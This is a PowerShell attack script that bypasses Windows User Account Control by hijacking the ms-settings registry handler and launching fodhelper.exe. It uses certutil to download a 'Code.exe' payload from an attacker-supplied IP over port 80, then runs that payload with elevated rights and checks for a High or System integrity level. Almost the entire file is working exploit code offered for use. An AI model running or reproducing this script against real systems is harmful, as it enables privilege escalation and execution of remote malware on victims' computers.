# PowerShell Script for Registry Manipulation and Privilege Escalation Checks
# 1) Checks for the existence of 32-bit or 64-bit fodhelper.exe
# 2) Modifies the registry to replace the default shell command for ms-settings
# 3) Executes fodhelper.exe and runs 'whoami /groups'
# 4) Downloads 'Code.exe' from a user-provided IP via Port 80
# 5) Modifies the registry again, setting the path to 'backup.exe'
# 6) Runs 'whoami /groups' again and checks for "High" privilege level
#
# Author DeMzDaRulez
# Updated 10Sep23


# Check if running in PowerShell
if ($null -eq $PSVersionTable.PSVersion) {
    Write-Host "Run in PowerShell"
    exit 1
}

# Step 1: Check and grab or exit
$fodhelper64 = "C:\Windows\SysNative\fodhelper.exe"
$fodhelper32 = "C:\Windows\System32\fodhelper.exe"
$fodhelper = ""

if (Test-Path $fodhelper64) {
    $fodhelper = $fodhelper64
} elseif (Test-Path $fodhelper32) {
    $fodhelper = $fodhelper32
} else {
    Write-Host "Neither 64-bit nor 32-bit fodhelper.exe found. Exiting."
    exit 1
}

# Run fodhelper
Start-Process $fodhelper

# Run 'whoami /groups' and find "Mandatory Label"
$whoamiOutput = whoami /groups
$mandatoryLabel = $whoamiOutput -match "Mandatory Label"

if ($mandatoryLabel -match "System") {
    Write-Host "You are System! Do it yourself"
    exit 1
} elseif ($mandatoryLabel -match "High") {
    $response = Read-Host "Are you aiming for System? (y/n)"
} else {
    Write-Host "You need help with $mandatoryLabel so let's go!"
}

# Step 2: Modify registry
New-Item "HKCU:\Software\Classes\ms-settings\Shell\Open\command" -Force
New-ItemProperty -Path "HKCU:\Software\Classes\ms-settings\Shell\Open\command" -Name "DelegateExecute" -Value "" -Force
Set-ItemProperty -Path "HKCU:\Software\Classes\ms-settings\Shell\Open\command" -Name "(default)" -Value "cmd /c start C:\Users\ted\shell.exe" -Force

# Step 3: CertUtil
$hostIP = Read-Host "Enter the IP address where you are serving the Code.exe payload via Port 80"
certutil -urlcache -split -f "http://$hostIP:80/Code.exe" .\backup.exe

# Step 4: Add to registry
REG ADD HKCU\Software\Classes\ms-settings\Shell\Open\command
REG ADD HKCU\Software\Classes\ms-settings\Shell\Open\command /v DelegateExecute /t REG_SZ 
REG ADD HKCU\Software\Classes\ms-settings\Shell\Open\command /d "$PWD\backup.exe" /f 

# Step 5: Recheck privilege level
Start-Process $fodhelper
$whoamiOutput = whoami /groups
$mandatoryLabel = $whoamiOutput -match "Mandatory Label"

if (-Not ($mandatoryLabel -match "System") -And -Not ($mandatoryLabel -match "High")) {
    Write-Host "Sorry, something went wrong. Check your hosting, naming, payload, IPs, ports, and feel free to run this script manually for error management."
}
